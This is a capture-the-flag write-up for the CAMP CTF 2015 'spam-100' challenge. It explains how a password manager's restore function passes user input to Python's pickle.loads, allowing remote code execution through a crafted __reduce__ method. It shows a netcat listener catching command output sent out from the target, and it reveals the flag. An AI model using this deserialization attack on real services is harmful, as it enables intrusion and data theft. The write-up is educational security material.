# CAMP CTF 2015: spam-100

**Category:** Pwn
**Points:** 100
**Solves:** 107
**Description:**

> You have problems remembering all your different passwords?
>
> [Here](spam.py) is THE tool for you!
>
> `nc challs.campctf.ccc.ac 10113`


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://github.com/vito-lbs/cccctf/tree/master/spam>
* <https://pacmans.army/?p=290>
* <http://blog.whatever.io/2015/08/18/campctf-spam100-pwn/>

### Meta

Keywords:

* Python Pickle `pickle`
* Remote Code Execution `rce`

We are given a Python file, which essentially is a Password Manager Service.

Running it creates a service that listens on port `1024`:

```bash
remote$ python spam.py
[...] <listens>

# On another terminal:
$ nc localhost 1024
Welcome to Super Password Authentication Manager (SPAM)!
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
1
Listing 0 passwords:
---
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
2
Enter name of the site: www.secret.com
Enter password: secreter
Password successfully added.
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
1
Listing 1 passwords:
www.secret.com: secreter
---
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
4
Your backup: eJzTSCkw4ApWLy8v1ytOTS5KLdFLzs9V5yowBApCBFKLgFwjrmI9AC0+DWg=

Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
3
Enter name of the site which should be deleted: www.secret.com
Entry successfully deleted.
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
1
Listing 0 passwords:
---
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
5
Paste your backup here: eJzTSCkw4ApWLy8v1ytOTS5KLdFLzs9V5yowBApCBFKLgFwjrmI9AC0+DWg=
Successfully restored 1 entries
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
1
Listing 1 passwords:
www.secret.com: secreter
---
Menu:
1) List Passwords
2) Add a Password
3) Remove a Password
4) Backup Passwords
5) Restore backup
```

We can list, add and remove passwords to sites as well as backup and restore them.

The site-password key-value pairs are stored in an dictionary named `entries`.

The vulnerability lies in the `spam_backup` and `spam_restore` functions.

When a user decides to backup data, `pickle` is first used to serialize the data using `pickle.dumps`, `zlib` then compresses the data and the data finally is base64 encoded and sent to the user.
When restoring backup data, the data provided by the user is base64 decoded, decompressed using `zlib` and finally deserialized using `pickle.loads`.

However, as shown in [this blog post](https://blog.nelhage.com/2011/03/exploiting-pickle/), `pickle.loads` calls the [`__reduce__` method of provided objects](https://docs.python.org/2/library/pickle.html#pickling-and-unpickling-extension-types) in order to know how to deserialize (and thus ["how to pickle"](https://docs.python.org/2/library/pickle.html#object.__reduce__)) the object.

To exploit this feature, we create a class object with a `__reduce__` method that executes arbitrary commands.
As described in [nelhage's blog post](https://blog.nelhage.com/2011/03/exploiting-pickle/), the method should return "either a string or tuple describing how to reconstruct this object on unpacking". Our tuple should consist of a callable and a tuple of arguments for this callable.

E.g. if we want to execute `subprocess.Popen('/bin/sh')`, the first tuple entry will be `subprocess.Popen` while the second entry will be a tuple containing the string `/bin/sh`: `('/bin/sh',)`.

[This python script](./solve.py) does the job:

```bash
# Terminal 1, listen for a connection on your site
$ while true; do nc -l 5555; done
[...]

# Terminal 2, execute solve.py with first argument being the command to be executed
$ p solve.py 'ls'
[+] Opening connection to localhost on port 1024: Done
[*] Closed connection to localhost port 1024

# Terminal 1, see output of ls
$ while true; do nc -l 5555; done
flag.txt
spam.py
[...]

# Terminal 2, read flag.txt
$ p solve.py 'cat flag.txt'
[+] Opening connection to localhost on port 1024: Done
[*] Closed connection to localhost port 1024

# Terminal 1, see flag.txt content
[...]
flag.txt
spam.py
CAMP15_76b5fad40644ac0616b301454250c408
```

The flag is `CAMP15_76b5fad40644ac0616b301454250c408`.

PS: If you want to read more about the pickle format (e.g. print out what `pickle.dumps(entries)` generates), have a look [here](https://www.cs.uic.edu/~s/musings/pickle.html).

Some alternative solutions such as [this writeup](http://reu.org.ua/camp-ctf-2015-spam.html) or [that writeup](http://sol.logdown.com/posts/2015/08/14/campctf-2015-pwn-spam) did provide the result of the `__reduce__` method directly.

## Other write-ups and resources

* <https://github.com/vito-lbs/cccctf/tree/master/spam>
* <https://pacmans.army/?p=290>
* <http://blog.whatever.io/2015/08/18/campctf-spam100-pwn/>
* [Russian](http://reu.org.ua/camp-ctf-2015-spam.html) 
* [Chinese](http://sol.logdown.com/posts/2015/08/14/campctf-2015-pwn-spam)
